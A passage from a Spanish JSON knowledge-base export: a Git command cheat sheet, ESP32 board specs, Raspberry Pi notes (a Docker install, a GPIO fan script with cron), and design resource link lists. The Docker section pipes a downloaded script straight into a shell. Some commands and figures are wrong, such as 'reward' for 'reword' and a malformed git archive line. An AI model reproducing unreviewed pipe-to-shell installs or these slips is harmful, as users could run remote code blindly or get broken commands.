\"nombre-archivo\"`\r\n\r\n- **Vuelve un archivo a su estado en un commit específico**\r\n\r\n  `git checkout \"id-commit\" \"nombre-archivo\"`\r\n\r\n## REMOTO\r\n\r\n- **Agregar un repositorio remoto en la ubicación actual**\r\n\r\n  `git remote add origin \"url-repositorio\"`\r\n\r\n- **Ver cambios de un repositorio principal sin ser colaboradores**\r\n\r\n  `git remote add upstream \"repo original\"`\r\n\r\n  `git fetch upstream`\r\n\r\n- **Revisar las fuentes remotas agregadas al repositorio, los repositorios remotos para push y fetch pueden ser distintos**\r\n\r\n  `git remote -v`\r\n\r\n- **Clonar el repositorio en el directorio actual**\r\n\r\n  `git clone \"url-repositorio\"`\r\n\r\n- **Clonar y poner nombre al directorio**\r\n\r\n  `git clone \"url-repositorio\" \"nombre-repositorio\"`\r\n\r\n- **Subir los cambios a remoto**\r\n\r\n  `git push origin master`\r\n\r\n- **Enviar cambios al repositorio remoto, -u Ayuda a que la próxima vez que queramos hacer push NO necesitemos especificar la rama**\r\n\r\n  `git push -u origin master`\r\n\r\n## BRANCHS\r\n\r\n- **Ver las ramas actuales**\r\n\r\n  `git branch`\r\n\r\n- **Ver todas las ramas, incluidas las remotas**\r\n\r\n  `git branch -a`\r\n\r\n- **Agregar una rama nueva**\r\n\r\n  `git branch \"nombre-rama\"`\r\n\r\n- **Cambiar de rama**\r\n\r\n  `git checkout \"nombre-rama\"`\r\n\r\n- **Cambiar de rama creandola porque no existe**\r\n\r\n  `git checkout -b \"nombre-rama-nueva\"`\r\n\r\n- **Fusionar ramas integrando codigo de una rama dentro de otra, colocarse en la rama donde se desean fusionar los cambios**\r\n\r\n  `git merge \"nombre-rama-a-fusionar\"`\r\n\r\n- **Limpiar ramas que ya están funsionadas y no sirven para nada**\r\n\r\n  `git branch -d \"nombre-rama\"`\r\n\r\n- **El -d no siempre funciona ya que comprueba que no siempre vallas a perder trabajo, es decir, que los commit de la rama a eliminar estén en master. Para obligar el borrado de la rama se utiliza -D (en mayúscula)**\r\n\r\n  `git branch -D \"nombre-rama\"`\r\n\r\n- **Eliminar una rama remota despues de comprobar con branch -a**\r\n\r\n  `git push origin :\"nombre-rama\"`\r\n\r\n- **Eliminar ramas de seguimiento remoto obsoletas en \"nombre\"**\r\n\r\n  `git remote prune \"nombre-remoto\"`\r\n\r\n  `git remote prune \"nombre-remoto\" --dry-run (no las elimina)`\r\n\r\n- **Realmente, los commit que había en esa rama no se eliminan. Git usa un recolector de basura de vez en cuando para borrar commits antiguos. En caso de borrar archivos binarios muy grandes será necesario llamar al gc de git explícitamente con**\r\n\r\n  `git gc`\r\n\r\n## TAG & RELEASE\r\n\r\n- **Crear un tag**\r\n\r\n  `git tag \"nombre-tag\"`\r\n\r\n- **Crear un tag con anotación de versión + mensaje**\r\n\r\n  `git tag -a v1.0.0 -m \"Versión 1.0.0\"`\r\n\r\n- **Crear un tag sobre un commit a través de su hash**\r\n\r\n  `git tag -a v.0.1.0 \"hash-commit\" -m \"Mensaje a mostrar\"`\r\n\r\n- **Crear un tag más elaborado**\r\n\r\n  `git tag -a \"version\" \"hash-commit\"`\r\n\r\n- **Ver los tag del repositorio**\r\n\r\n  `git tag`\r\n\r\n- **Eliminar un tag**\r\n\r\n  `git tag -d \"nombre-tag\"`\r\n\r\n- **Ver información de un tag específico**\r\n\r\n  `git show \"tag\"`\r\n\r\n- **Subir los tags al repositorio**\r\n\r\n  `git push --tags`\r\n\r\n## VERSIONADO\r\n\r\n- v1.0.0\r\n- Mayor.Menor.Parche\r\n- Más información acerca del versionado: [semver.org](https://semver.org/)\r\n\r\n## ISSUES\r\n\r\n- **Cerrar un Issue con un commit (fixes, closes, resolves)**\r\n\r\n  `git commit -am \"mensaje... fixes|closes|resolves #\"num-issue\"\"`\r\n\r\n## STASH [WIP - Working In Progress]\r\n\r\nEl stash se utiliza para guardar el trabajo actual en el tiempo y poder volver a el # en cualquier momento\r\n\r\n`git stash `\r\n\r\n`git stash save`\r\n\r\n`git stash save \"mensaje a mostrar\"`\r\n\r\n- **Ver todos los trabajos en progreso que hay**\r\n\r\n  `git stash list`\r\n\r\n- **Igual a la anterior con más información**\r\n\r\n  `git stash list --stat`\r\n\r\n- **Ver información del último stash realizado (cambios realizados en archivos)**\r\n\r\n  `git show stash`\r\n\r\n- **Ver informaciónd e un stash en concreto**\r\n\r\n  `git show stash@{0}`\r\n\r\n- **Recuperar el último ingreso del stash y eliminarlo al mismo tiempo**\r\n\r\n  `git stash pop`\r\n\r\n- **Recuperar el último ingreso del stash**\r\n\r\n  `git stash apply`\r\n\r\n- **Recuperar un stash por su ID**\r\n\r\n  `git stash apply \"ID-stash\" ES EQUIVALENTE A git stash apply stash@{0}`\r\n\r\n  Ejemplo: `git stash apply stash@{1}`\r\n\r\n- **Eliminar el último stash realizado**\r\n\r\n  `git stash drop ES EQUIVALENTE A git stash drop stash@{0}`\r\n\r\n  `git stash drop \"ID-stash\"`\r\n\r\n- **Guardar todo menos los archivos en el stage (escenario)**\r\n\r\n  `git stash save --keep-index`\r\n\r\n- **Incluye todos los archivos junto a los que git no le da seguimiento ()**\r\n\r\n  `git stash save --include-untracked`\r\n\r\n- **Borrar todas las entradas del stash sin recuperación**\r\n\r\n  `git stash clear`\r\n\r\n## REBASE\r\n\r\n- **Traer commits de otra rama a la actual y rebasarlos**\r\n\r\n  `git rebase \"nombre-rama\"`\r\n\r\n- **Rebase interactivo: ordenar commits, corregir mensajes de estos, unirlos o separarlos**\r\n\r\n  `git rebase -i HEAD~\"numero-de-commits\"`\r\n\r\n- **Opciones del comando anterior**\r\n\r\n**squash** = une el commit donde es utilizado con el anterior\r\n\r\n**reward** = cambiar el mensaje del commit\r\n\r\n**edit** = editar uno o más commits (Ej: separar archivos)\r\n\r\n- **En caso de separar un commit en dos sera necesario dar un salto atrás**\r\n\r\n  `git reset HEAD^`\r\n\r\n1. Agregar uno de los archivos al stage y realizar el commit\r\n2. Agregar los demás archivos y realizar los commits deseados\r\n3. Continuar el rebase con:\r\n\r\n`git rebase --continue`\r\n\r\n## COMANDOS ÚTILES\r\n\r\n- **Buscar una cadena en todo el ábol de contenido**\r\n\r\n  `git grep \"\"palabra o frase a buscar\"\"`\r\n\r\n- **Interfaz gráfica para un repositorio local**\r\n\r\n  `sudo apt-get install gitk`\r\n  `gitk`\r\n\r\n- **Ver objeto de árbol junto con el nombre y modo de cada uno, y el valor blob SHA-1**\r\n\r\n  `git ls-tree \"hash-commit\"`\r\n\r\n- **Usando el valor SHA-1 se puede ver el tipo de objeto**\r\n\r\n  `git cat-file -p \"valor-SHA-1\"`\r\n\r\n- **Crear archivo zip o tar de un árbol del repositorio**\r\n\r\n  `git archive -- -format=tar master`\r\n\r\n- **Chequeo de integridad del sistema de archivos de git. Detecta cualquier objeto corrompido**\r\n\r\n  `git fsck`\r\n\r\n## ALIAS\r\n\r\n`git config --global alias.lg \"log --oneline --decorate --all --graph\"`\r\n\r\n`git config --global alias.s \"status -s -b\"`\r\n\r\n## SSH\r\n\r\n- **Entrar en el directorio de usuario**\r\n\r\n  cd user-name/.ssh\r\n\r\n- **Crear las claves ssh para GitHub**\r\n\r\n  ssh-keygen -t rsa -C \"direccion@de.correo\"\r\n\r\n- **Registrar GitHub para SSH**\r\n\r\n  ssh -T git@github.com\r\n\r\n## ERRORES COMUNES\r\n\r\n- **Agregando todos los archivos al escenario**\r\n\r\n  `git add -A`\r\n\r\n  warning: LF will be replaced by CRLF in \"rutaArchivo\"\r\n\r\n  The file will have its orginal line endings in your working directory\r\n\r\n  **Solución:**\r\n  `git config core.autocrlf true`\r\n",
    "path": "/git/referencia"
  },
  {
    "id": 30,
    "title": "esp32-sim7600",
    "content": "\r\n![](./static/esp32-sim7600e-schema.jpg)\r\n\r\n- **Las especificaciones de Hardware**\r\n\r\n  - Chipset: ESP32-WROVER-B, AXP192 chip de gestión de energía\r\n  - Flash: 4MB\r\n  - Estática SRAM: 8MB\r\n  - SRAM: SRAM de 520 kB\r\n  - Botón: interruptor de encendido PWR, reinicio\r\n  - USB a TTL: CP2104\r\n  - Reloj de coche: oscilador de cristal de 40MHz\r\n  - Equipo periférico: ranura para tarjeta SIM Nano, ranura para tarjeta Mini PCIE\r\n  - Antena: antena integrada (por defecto)\r\n  - Voltaje de funcionamiento: 2,7 V a 3,6 V\r\n  - Corriente de trabajo\r\n  - Corriente de sueño: aprox. 700ma\r\n  - ¿Rango de temperatura de funcionamiento: -40 °C? + 85 ℃\r\n  - Tamaño: 75*33*10,5mm\r\n  - Peso: 14,5g\r\n\r\n- **Especificaciones de alimentación**\r\n\r\n  - Entrada de energía: USB 5V / 1A\r\n  - Corriente de carga: 500 mA\r\n  - Entrada de batería: 3,7-4,2 V\r\n  - IC de carga: AXP192\r\n  - Conector JST: 2 pines 2,0mm\r\n  - USB: Tipo C\r\n\r\n- **Inalámbrico en línea**\r\n\r\n  - Estándar: FCC / CE-RED / IC / TELEC / KCC / SRRC / NCC (ESP32 chip)\r\n  - Protocolo: 802,11 b / g / n (802.11n, velocidad de hasta 150Mbps) A-MPDU y agregación de A-MSDU, soporta Intervalo de protección de 0,4 μs\r\n  - Rango de frecuencia: 2,4 GHz/2,5 GHz (2400M 2483,5 M)\r\n  - Potencia de transmisión: 22dBm\r\n  - Distancia de comunicación: 300m\r\n\r\n- **Bluetooth**\r\n  - Protocolo: se ajusta a los estándares Bluetooth v4.2BR/EDR y BLE\r\n  - Radio Frecuencia: sensibilidad-97dBm NZIF receptor clase 1, Clase 2 y Clase 3 Transmisor AFH\r\n  - Audio: CVSD y SBC de audio\r\n  - Software especificaciones\r\n  - Modo Wi-Fi: Estación de trabajo/SoftAP + estación/P2P\r\n  - Mecanismo de seguridad: WPA / WPA2/ WPA2-Enterprise/ WPS\r\n  - Método de cifrado: AES / RSA / ECC / SHA\r\n  - Actualización del Firmware: UART descargar/OTA (descargar y escribir el firmware a través de la red/host)\r\n  - Desarrollo de Software: compatible con desarrollo de servidor en la nube/SDK para el desarrollo de firmware del usuario\r\n  - Protocolo de red: IPv4... IPv6 SSL TCP/UDP/HTTP/FTP/MQTT\r\n  - Configuración del usuario: AT + set de instrucciones, servidor en la nube, Android / iOSapp\r\n  - Sistema operativo: freeros\r\n",
    "path": "/iot/esp32/esp32-sim7600"
  },
  {
    "id": 31,
    "title": "docker",
    "content": "\r\n## Docker & docker-compose\r\n\r\nAlgunas imagenes deben ser construidas bajo una distribución base para la arquitectura ARM\r\n\r\n- Instalación\r\n\r\n```sh\r\ncurl -sSL https://get.docker.com | sh\r\nsudo usermod -aG docker pi\r\ndocker run hello-world\r\nsudo apt-get install -y libffi-dev libssl-dev\r\nsudo apt-get install -y python3 python3-pip\r\nsudo apt-get remove python-configparser\r\nsudo pip3 -v install docker-compose\r\n```\r\n",
    "path": "/iot/raspberrypi/docker"
  },
  {
    "id": 32,
    "title": "raspbian-vs-dietpi",
    "content": "\r\n## Raspian vs DietPi\r\n\r\nReferencia: [https://www.softzone.es/programas/linux/raspbian-vs-dietpi-distro-ligera-raspberry-pi/](https://www.softzone.es/programas/linux/raspbian-vs-dietpi-distro-ligera-raspberry-pi/)\r\n\r\nEl (o la, dependiendo de cada persona) Raspberry Pi es sin duda el micro-ordenador más popular que podemos comprar. Con este dispositivo de poco más de 30 euros podemos montarnos nuestra propia retro-consola, tener un servidor casero, un reproductor multimedia o un ordenador totalmente funcional. Y todo ello gracias a Linux. Aunque la distro oficial del Raspberry Pi es Raspbian, en la red podemos encontrar otras muchas alternativas con las que dar vida a este dispositivo. Y si estamos buscando una distro ligera que nos permita aprovechar al máximo los recursos, entonces una de las que debemos tener en cuenta es DietPi.\r\n\r\nDietPi es una distro para el Raspberry Pi especialmente diseñada para consumir muy pocos recursos. Esta distribución se basa en Debian (igual que Raspbian) pero reduce el tamaño total de la distro a tan solo 400 MB, 3 veces menos que Raspbian Lite. Esta distribución cuenta con importantes optimizaciones en la CPU y la RAM garantizando el menor consumo y la disponibilidad de todo el rendimiento en todo momento.\r\nLa interfaz de esta distribución, Whiptail, es muy ligera y muy sencilla de utilizar para que nadie tenga problemas con ella. Además, cuenta con una herramienta que nos permite instalar las aplicaciones que queramos o necesitemos muy fácilmente, un completo motor de configuración para personalizar el funcionamiento del hardware y del software y un sistema de copias de seguridad para tener siempre a salvo nuestros datos y nuestras configuraciones.\r\nUn completo sistema de logs, un gestor de actualizaciones y funciones para automatización terminan de dar forma a la que probablemente será una de las distribuciones más ligeras para Raspberry Pi.\r\n\r\n## Diferencias\r\n\r\n- **Raspbian**\r\n\r\n  Es una distribución muy grande. Demasiado. Además de todo el ecosistema Debian, esta distro viene por defecto con una gran cantidad de aplicaciones y herramientas instaladas, muchas de las cuales seguramente la mayor parte de los usuarios no necesite. Esto hace que esta distro ocupe mucho espacio en la tarjeta de memoria y, además, consuma ciclos de CPU y memoria innecesarios. Además, Raspbian tiene aplicaciones que ni siquiera son software libre, como Wolfram Alpha.\r\n\r\n  Esta distro cuenta con una versión reducida: Raspbian Lite. Esta distro es una versión más reducida de Raspbian. Tanto que ni siquiera viene con entorno gráfico. Por ello, esta versión carece de todas las aplicaciones de escritorio, como LibreOffice, SonicPi, Scratch,Wolfram Engenie, etc. Esta distro está enfocada a usuarios ya avanzados que vayan a usar el Raspberry Pi de forma remota o desde terminal. Pero si queremos darle utilidad gráfica, no merece la pena.\r\n  A pesar de carecer de todo esto, Raspbian Lite ocupa en torno a 1.3 GB en la tarjeta de memoria.\r\n\r\n- **DietPi**\r\n\r\n  Es capaz de ofrecernos una distro basada en Debian, con entorno gráfico y aplicaciones preinstaladas y que ocupa tan solo 400 MB en la tarjeta de memoria una vez instalado. Además, cada usuario puede instalar fácilmente, desde su propio instalador, las aplicaciones que realmente necesite. Por ejemplo, es raro utilizar LibreOffice en el Raspberry Pi, pero es muy común utilizar VLC o un navegador web como Firefox. DietPi es infinitamente más personalizable que, por ejemplo, Raspbian Lite.\r\n\r\n## Conclusión\r\n\r\nAl final, como siempre, esto depende de las necesidades de cada usuario. Si queremos ir a lo fácil y lo oficial, la mejor opción que podemos instalar es Raspbian. Esta distro viene con una gran cantidad de paquetes y programas que, aunque ocupan mucho espacio y más recursos de los necesarios, nos harán la vida más fácil. Raspbian Lite no es una opción muy recomendable, ya que parece una versión de Raspbian mal recortada y compilada. Podemos descargar Raspbian (o la versión Lite) desde la web oficial de Raspberry Pi.\r\nSi queremos aprovechar al máximo el rendimiento de nuestro micro-ordenador y somos de los que nos gusta trastear y personalizar nuestros sistemas operativos, DietPi seguro que nos encanta. Esta distro es totalmente gratuita y podemos descargarla en forma de imagen desde el siguiente enlace.\r\n",
    "path": "/iot/raspberrypi/raspbian-vs-dietpi"
  },
  {
    "id": 33,
    "title": "referencia",
    "content": "\r\n## Pines\r\n\r\n![GPIO Modelo B](./static/raspberry-gpio-model-b.png)\r\n",
    "path": "/iot/raspberrypi/referencia"
  },
  {
    "id": 34,
    "title": "temperatura-ventilador",
    "content": "\r\n- **1º Script. Habilitar el PIN GPIO del ventilador en cada reinicio**\r\n\r\n  ```bash\r\n  #!/bin/bash\r\n  ###########################################################################\r\n  ### References:\r\n  ### I/O Control:\r\n  ### http://www.instructables.com/id/Control-Stuff-with-your-Raspberry-Pi-GPIO/?ALLSTEPS\r\n  ### http://www.raspberrypi.org/forums/viewtopic.php?p=131069&sid=88282aaa50634ad7db83c3965625c033#p131069\r\n  ###\r\n  ###########################################################################\r\n  ### Replace with your correct GPIO number\r\n  for pin in 17; do\r\n  gpio write $pin 0\r\n  gpio export $pin out\r\n  done\r\n  exit 0\r\n  ```\r\n\r\n  Para hacer ejecutable este archivo, utilizamos este comando:\r\n\r\n  ```bash\r\n  chmod u+x OnReboot.sh\r\n  ```\r\n\r\n- **2º Script. Se encargará de controlar el puerto GPIO donde tienes conectado el ventilador, llamaremos a este archivo Thermostat.sh**\r\n\r\n  ```bash\r\n  #!/bin/bash\r\n  ###########################################################################\r\n  ### References:\r\n  ### I/O Control:\r\n  ### http://www.instructables.com/id/Control-Stuff-with-your-Raspberry-Pi-GPIO/?ALLSTEPS\r\n  ### http://www.raspberrypi.org/forums/viewtopic.php?p=131069&sid=88282aaa50634ad7db83c3965625c033#p131069\r\n  ###\r\n  ### bash if/then\r\n  ### http://www.thegeekstuff.com/2010/06/bash-if-statement-examples/\r\n  ### http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO-6.html\r\n  ### http://www.dreamsyssoft.com/unix-shell-scripting/ifelse-tutorial.php\r\n  ###\r\n  ### bash sleep ()\r\n  ### http://www.cyberciti.biz/faq/linux-unix-sleep-bash-scripting/\r\n  ###########################################################################\r\n  #\r\n  SoCTemp=\"`sudo /opt/vc/bin/vcgencmd measure_temp | tr -d \"=temp.'C\"`\"\r\n  # SoCTemp=300 # Enable this line for debugging\r\n  LowLimit=490\r\n  HighLimit=510\r\n  #\r\n  echo \"Low Limit :\"$LowLimit\r\n  echo \"High Limit:\"$HighLimit\r\n  echo \"SoC Temp  :\"$SoCTemp\r\n  ## echo \"1\" > /sys/class/gpio/gpio17/value\r\n  ###########################################################################\r\n  if [ $SoCTemp -le $HighLimit ]; then\r\n     ### Turn on GPIO 21 off:\r\n     echo \"SoC is cool($SoCTemp), Turning off the fan in 20 seconds ...\"\r\n     sleep 20 ; echo \"0\" > /sys/class/gpio/gpio17/value\r\n     echo \"Done!\"\r\n     exit 0\r\n  fi\r\n  if [ $SoCTemp -ge $LowLimit ]; then\r\n     ### Turn on GPIO 21 on:\r\n     echo \"SoC is getting hot ($SoCTemp), Turning on the fan now!\"\r\n     echo \"1\" > /sys/class/gpio/gpio17/value\r\n     echo \"Done!\"\r\n     exit 0\r\n  fi\r\n  ```\r\n\r\n  > Asignar permisos de ejecución\r\n\r\n  ```bash\r\n  chmod u+x Thermostat.sh\r\n  ```\r\n\r\n- **Indicar al programador de tareas cron cuando utilizar cada script**\r\n\r\n  ```bash\r\n  @reboot /home/pi/OnReboot.sh &\r\n  */1 * * * * /home/pi/Thermostat.sh &\r\n  ```\r\n\r\nLuego del siguiente reinicio, se ejecutará el archivo OnReboot.sh otorgando las permisologías y el archivo Thermostat.sh se ejecutará cada minuto en el background, controlando el encendido y apagado del ventilador.\r\n",
    "path": "/iot/raspberrypi/temperatura-ventilador"
  },
  {
    "id": 35,
    "title": "referencia",
    "content": "\r\n## Dibujo digital\r\n\r\n- **Krita**. Pintura y dibujo digital\r\n  [https://maslinux.es/software-libre-excelente-el-caso-de-krita/](https://maslinux.es/software-libre-excelente-el-caso-de-krita/)\r\n\r\n## Música\r\n\r\n- **MIXX**. Herramienta DJ\r\n  [https://www.mixxx.org](https://www.mixxx.org)\r\n\r\n## Mensajería\r\n\r\n- **Pidgin**. Mensajería instantánea multiprotocolo\r\n  [http://pidgin.im/](http://pidgin.im/)\r\n\r\n## Estadísticas Sistema Operativo\r\n\r\n- **SAR**. Muestra todo tipo de estadísticas del sistema operativo\r\n  ",
    "path": "/opensource/referencia"
  },
  {
    "id": 36,
    "title": "Animaciones",
    "content": "# Animaciones\r\n\r\n## Recursos\r\n\r\n- [30 Awesome SVG Animation For Your Inspiration](https://www.hongkiat.com/blog/svg-animations/)\r\n- [8 simple CSS3 transitions that will wow your users](https://www.webdesignerdepot.com/2014/05/8-simple-css3-transitions-that-will-wow-your-users/)\r\n",
    "path": "/resources/animations"
  },
  {
    "id": 37,
    "title": "Automatización",
    "content": "# Automatización\r\n\r\n## Herramientas\r\n\r\n- [Apps & Software Integration | Over 1000 Apps | Make](https://www.make.com/en/integrations)\r\n- [Explore All Apps | Zapier](https://zapier.com/apps)",
    "path": "/resources/automation"
  },
  {
    "id": 38,
    "title": "Colores",
    "content": "# Colores\r\n\r\n- [ColorZilla - Eyedropper, Color Picker, Gradient Generator and more](https://www.colorzilla.com/)\r\n- [Material Palette - Material Design Color Palette Generator](https://www.materialpalette.com/)\r\n- [Color Hunt](https://colorhunt.co/)\r\n\r\n## Combinaciones\r\n\r\n- [CANVA 100-combinaciones-colores-como-aplicarlas-disenos/](https://www.canva.com/es_mx/aprende/100-combinaciones-colores-como-aplicarlas-disenos/)\r\n- [CANVA 50-paletas-colores-visualmente-impactantes-que-inspiran/](https://www.canva.com/es_mx/aprende/50-paletas-colores-visualmente-impactantes-que-inspiran/)\r\n\r\n## Herramientas\r\n\r\n- [https://www.canva.com/colors](https://www.canva.com/colors)\r\n- [HTML Color Codes](https://htmlcolorcodes.com/es/selector-de-color/)\r\n- [https://coolors.co/](https://coolors.co/)\r\n- [https://color.adobe.com/create/color-wheel](https://color.adobe.com/create/color-wheel)\r\n- [https://www.colorzilla.com/](https://www.colorzilla.com/)\r\n- [https://www.materialpalette.com/](https://www.materialpalette.com/)\r\n- [HTML Colors from Image](https://html-color-codes.info/colors-from-image/)\r\n- [https://www.sessions.edu/color-calculator/](https://www.sessions.edu/color-calculator/)",
    "path": "/resources/colors"
  },
  {
    "id": 39,
    "title": "Gifs & Emojis",
    "content": "# Gifs & Emojis\r\n\r\n## Recursos\r\n\r\n### Emojis\r\n\r\n- [Bitmoji](https://www.bitmoji.com/)\r\n- [Emojipedia](https://emojipedia.org/)\r\n- [Emoji Keyboard](https://emojikeyboard.org/)\r\n- [Get Emoji](https://getemoji.com/)\r\n- [Emoji Copy](https://www.emojicopy.com/)\r\n\r\n### Gifs\r\n\r\n- [Giphy](https://giphy.com/)\r\n- [Tenor](https://tenor.com/)\r\n- [Imgur](https://imgur.com/)\r\n- [Reddit Gifs](https://www.reddit.com/r/gifs/)\r\n- [Gifbin](https://www.gifbin.com/)",
    "path": "/resources/gifs_emojis"
  },
  {
    "id": 40,
    "title": "Hosting y dominios",
    "content": "# Hosting y dominios\r\n\r\n## Dominios\r\n\r\n[Buy a domain name - Register cheap domain names from $0.99 - Namecheap](https://www.namecheap.com/)\r\n\r\n## Hosting\r\n\r\n[SiteGround – Alojamiento Web de Alta Calidad](https://www.siteground.es/)\r\n\r\n[Leading Web Hosting, Domain, & WordPress Provider | Unleash Your Website's Full Potential](https://www.bluehost.com/)\r\n\r\n",
    "path": "/resources/hosting_domain"
  },
  {
    "id": 41,
    "title": "Iconos y animaciones",
    "content": "# Iconos y animaciones\r\n\r\n## Recursos\r\n\r\n- [Canva Icons](https://www.canva.com/icons/)\r\n- [Free Icons and Stickers - Millions of images to download](https://www.flaticon.com/)\r\n- [7,400,000+ free and premium vector icons, illustrations and 3D illustrations](https://www.iconfinder.com/)\r\n- [Font Awesome](https://fontawesome.com/)\r\n- [LottieFiles: Download Free lightweight animations for website & apps.](https://lottiefiles.com/)\r\n- [Freepik | Graphic Resources for everyone](https://www.freepik.com/)\r\n- [Streamline Icons: The Only Icon System](https://www.streamlinehq.com/)\r\n- [EmojiAll](https://www.emojiall.com/)\r\n- [Iconos Gratis, Ilustraciones Clipart, Fotos y Música](https://iconos8.es/)\r\n- [iconmonstr - Free simple icons for your next project](https://iconmonstr.com/)\r\n- [Material Design Icons - Icon Library - Pictogrammers](https://pictogrammers.com/library/mdi/)",
    "path": "/resources/icons"
  },
  {
    "id": 42,
    "title": "Imágenes",
    "content": "# Imágenes\r\n\r\n## Recursos\r\n\r\n- [Canva Fotos](https://www.canva.com/photos/)\r\n- [Freepik | Graphic Resources for everyone](https://www.freepik.com/)\r\n- [Free Stock Photos, Royalty Free Stock Images & Copyright Free Pictures · Pexels](https://www.pexels.com/)\r\n- [Free Stock Photos • picjumbo](https://picjumbo.com/)\r\n- [2.8 million+ Stunning Free Images to Use Anywhere - Pixabay - Pixabay](https://pixabay.com/)\r\n- [Beautiful Free Images & Pictures | Unsplash](https://unsplash.com/)\r\n- [Free Stock Photos and Images - StockSnap.io](https://stocksnap.io/)\r\n\r\n## Herramientas\r\n\r\n- [Canva](https://www.canva.com/)\r\n- [Google Web Designer](https://webdesigner.withgoogle.com/)\r\n\r\n## Herramientas Online\r\n\r\n- [Resize Images Online](https://www.reduceimages.com/)\r\n- [Compressor.io - optimize and compress JPEG photos and PNG images](https://compressor.io/)\r\n- [Blobmaker - Make organic SVG shapes for your next design](https://www.blobmaker.app/)\r\n- [Photopea | Online Photo Editor](https://www.photopea.com/)\r\n- [Remove Background from Image for Free – remove.bg](https://www.remove.bg/)\r\n- [iLoveIMG | The fastest free web app for easy image modification.](https://www.iloveimg.com/)\r\n- [Partir Imagenes](https://pinetools.com/es/partir-imagenes)\r\n- [Crop Image](https://www.iloveimg.com/crop-image)\r\n- [Image Color Picker](https://imagecolorpicker.com/)\r\n- [Color Safe](http://colorsafe.co/)\r\n- [HTML Color Codes - From Image](https://html-color-codes.info/colors-from-image/)\r\n\r\n## Extensiones de navegador\r\n\r\n- [ColorZilla](https://www.colorzilla.com/)",
    "path": "/resources/images"
  },
  {
    "id": 43,
    "title": "Inspiración",
    "content": "\r\n# Inspiración\r\n\r\n## Enlaces de interés\r\n\r\n- [Pinterest](https://es.pinterest.com/)\r\n- [Behance](https://www.behance.net/)\r\n- [Dribbble](https://dribbble.com/)\r\n- [Adobe](https://new.express.adobe.com/?locale=es-ES)",
    "path": "/resources/inspiration"
  },
  {
    "id": 44,
    "title": "Loaders",
    "content": "# Loaders\r\n\r\n## Recursos\r\n\r\n- [https://samherbert.net/svg-loaders/](https://samherbert.net/svg-loaders/)",
    "path": "/resources/loaders"
  },
  {
    "id": 45,
    "title": "Mockups",
    "content": "# Mockups\r\n\r\n## Recursos\r\n\r\n- [Graphic Burger](https://graphicburger.com)\r\n- [Freebies](https://freebies.bypeople.com)",
    "path": "/resources/mockups"
  },
  {
    "id": 46,
    "title": "Música",
    "content": "# Música\r\n\r\n## Recursos\r\n\r\n- [FreeSound](https://freesound.org/)\r\n- [SoundCloud](https://soundcloud.com/)\r\n- [Pixabay Music](https://pixabay.com/es/music/)\r\n- [MusOpen](https://musopen.org/music)\r\n\r\n## Herramientas\r\n\r\n- [HeadLiner](https://www.headliner.app/)",
    "path": "/resources/music"
  },
  {
    "id": 47,
    "title": "Notion",
    "content": "# Notion\r\n\r\nNotion es una herramienta de productividad y colaboración que permite a los usuarios crear, organizar y compartir documentos, bases de datos, tareas y notas en un solo lugar.\r\n\r\n## Enlaces de interés\r\n\r\n- Página oficial [https://www.notion.so/](https://www.notion.so/)\r\n\r\n## Analíticas\r\n\r\n- Analíticas para el espacio de trabajo [https://notionlytics.com/](https://notionlytics.com/)\r\n\r\n## Iconos\r\n\r\n- [https://www.noticons.com/](https://www.noticons.com/)\r\n\r\n## Charts\r\n\r\n- [https://notioncharts.io/](https://notioncharts.io/)\r\n- [https://notion2charts.com/](https://notion2charts.com/)\r\n\r\n## Widgets\r\n\r\n- [https://indify.co/](https://indify.co/)\r\n- [https://apption.co/](https://apption.co/)\r\n\r\n## Formularios\r\n\r\n- [https://chilipepper.io/](https://chilipepper.io/)\r\n- [https://notionforms.io/](https://notionforms.io/)\r\n\r\n## Bloques\r\n\r\n- [https://getkairo.com/notion-blocks](https://getkairo.com/notion-blocks)",
    "path": "/resources/notion"
  },
  {
    "id": 48,
    "title": "Patrones",
    "content": "# Patrones\r\n\r\n## Recursos\r\n\r\n- [DinPattern](https://dinpattern.com/category/patterns)\r\n- [Colour Lovers Patterns](https://www.colourlovers.com/patterns/most-loved/all-time/meta)\r\n- [TopTal Patterns](https://www.toptal.com/designers/subtlepatterns/)\r\n- [Patternico](https://patternico.com/)\r\n- [LostAndTaken](https://lostandtaken.com/)",
    "path": "/resources/patterns"
  },
  {
    "id": 49,
    "title": "PDF",
    "content": "# PDF\r\n\r\n## Herramientas\r\n\r\n- [PDF to Flipbook](https://heyzine.com/es)",
    "path": "/resources/pdf"
  },
  {
    "id": 50,
    "title": "QR",
    "content": "# QR\r\n\r\n## Herramientas\r\n\r\n- [HoverCode](https://hovercode.com/)\r\n- [QR Code Monkey](https://www.qrcode-monkey.com/)\r\n- [QR Code Generator](https://www.qr-code-generator.com/)",
    "path": "/resources/qr"
  },
  {
    "id": 51,
    "title": "Templates",
    "content": "# Templates\r\n\r\n## Recursos\r\n\r\n- [HTML 5 UP](https://html5up.net/)\r\n- [Templated](https://templated.co/)\r\n- [Wrappixel Free Templates](https://www.wrappixel.com/?s=free&post_type=download)\r\n",
    "path": "/resources/templates"
  },
  {
    "id": 52,
    "title": "Tipografía",
    "content": "# Tipografía\r\n\r\n## Recursos\r\n\r\n- [Google Fonts](https://fonts.google.com/)\r\n- [Dafont](https://www.dafont.com/es/)\r\n- [FontQuirrel](https://www.fontsquirrel.com/fonts/web-symbols)\r\n\r\n## Herramientas\r\n\r\n- [Fonts Ninja](https://www.fonts.ninja/)\r\n- [Generate font pairing using neural nets](https://fontjoy.com/)",
    "path": "/resources/typography"
  },
  {
    "id": 53,
    "title": "Videos",
    "content": "# Videos\r\n\r\n## Recursos\r\n\r\n- [Videvo](https://www.videvo.net/es/videos-gratis/#rs=submenu)\r\n- [Pixabay Videos](https://pixabay.com/es/videos/)\r\n\r\n## Herramientas\r\n\r\n- [Github Video Downloader](https://vidsavefrom.com/es/)\r\n- [Clipchamp](https://www.clipchamp.com/es/)\r\n- [Vimeo](https://vimeo.com/)\r\n- [Powtoon](https://www.powtoon.com/)\r\n",
    "path": "/resources/videos"
  },
  {
    "id": 54,
    "title": "WhatsApp",
    "content": "# WhatsApp\r\n\r\nGenerador de enlaces WhatsApp para enviar mensajes\r\n\r\n- [Walink](https://walink.co/)\r\n- [ᐈ Envía un WhatsApp sin contacto | Joinchat](https://join.chat/es/enviar-un-whatspp-sin-contacto/)",
    "path": "/resources/whatsapp"
  },
  {
    "id": 55,
    "title": "Wordpress",
